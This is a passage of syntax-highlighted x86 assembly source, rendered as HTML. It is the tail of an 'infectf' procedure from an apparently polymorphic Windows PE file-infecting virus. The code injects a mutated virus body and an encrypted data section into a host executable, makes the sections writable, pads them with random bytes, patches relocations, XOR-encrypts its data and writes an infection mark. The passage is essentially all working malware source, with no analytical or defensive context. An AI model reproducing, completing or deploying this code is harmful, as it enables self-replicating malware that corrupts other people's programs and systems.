       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">inserting</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">genotype</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc9">section</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InsertCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">insert_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">genotype_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">insert_raw</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Copying</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">genotype</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data_size</span><span class="sc4">+</span><span class="sc5">virtual_data_size</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnddata</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edx.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;choose r/w section</span><span class="sc0">
  </span><span class="sc5">@@search_rw_section</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@nofound</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@found</span><span class="sc0">
  </span><span class="sc5">@@nofound</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@search_rw_section</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;add in last section, changing atributes</span><span class="sc0">
  </span><span class="sc5">@@found</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_Characteristics</span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc4">],</span><span class="sc0"> \
                                  </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc4">+</span><span class="sc0"> \
                                  </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">data_size</span><span class="sc4">+</span><span class="sc5">virtual_data_size</span><span class="sc0">     </span><span class="sc1">;add virus DATA section+rnd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">rnddata</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">inserting</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc9">section</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InsertCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">genotype_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">genotype_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">insert_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">data_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">insert_raw</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">data_raw</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Copying</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data_size</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">

</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Filling</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">bss</span><span class="sc4">+</span><span class="sc5">rnd</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">rnddata</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virtual_data_size</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">;/4</span><span class="sc0">
  </span><span class="sc5">@@rndfill</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@rndfill</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc9">Import</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.NT_OptionalHeader.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">;set imagesize to align(last section rva+size)</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">vbody</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">mutant_size</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@@fix_next</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">@@done666</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">disasm</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">disasm_size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">@@no_fix666</span><span class="sc0">          </span><span class="sc1">;small enought to not have a offset</span><span class="sc0">
  </span><span class="sc5">@@fixdata</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">disasm_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">DF_DATA</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@fixmem</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">disasm_data</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@fix_data_mem</span><span class="sc0">
  </span><span class="sc5">@@fixmem</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">disasm_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">DF_MEM</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@no_fix666</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">disasm_mem</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@fix_data_mem</span><span class="sc0">
  </span><span class="sc5">@@no_fix666</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">disasm_size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@fix_next</span><span class="sc0">

  </span><span class="sc5">@@done666</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">data_raw</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">GMH</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">GMH</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">code_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">CODE_OFS</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">mutant_size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">CODE_SIZE</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">data_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">DATA_OFS</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">genotype_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">GENS_OFS</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">data_start</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data_enc_size</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">key1</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">@@data</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">;encrypt</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@data</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFECTION_MARK</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">infection</span><span class="sc0"> </span><span class="sc5">mark</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc0">

  </span><span class="sc5">@@error_close</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapFile</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">file</span><span class="sc0"> </span><span class="sc5">unmapped</span><span class="sc4">&gt;</span><span class="sc0">
  </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">



  </span><span class="sc5">@@fix_data_mem</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Fixing</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">GENS_OFS</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">genotype_rva</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;there's just 1 place to point in genotype</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@fixthat</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">DATA_OFS</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">data_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">data_size</span><span class="sc4">+</span><span class="sc5">virtual_data_size</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@no_data</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@fixthat</span><span class="sc0">
  </span><span class="sc5">@@no_data</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">CODE_OFS</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">code_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">CODE_SIZE</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@no_fix</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">@@no_fix</span><span class="sc0">
  </span><span class="sc5">@@fixthat</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@skip</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">           </span><span class="sc1">;old_base</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">;new_base</span><span class="sc0">
  </span><span class="sc5">@@skip</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">@@fixthat</span><span class="sc0">

  </span><span class="sc5">@@no_fix</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infectf</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span></div></body>
</html>
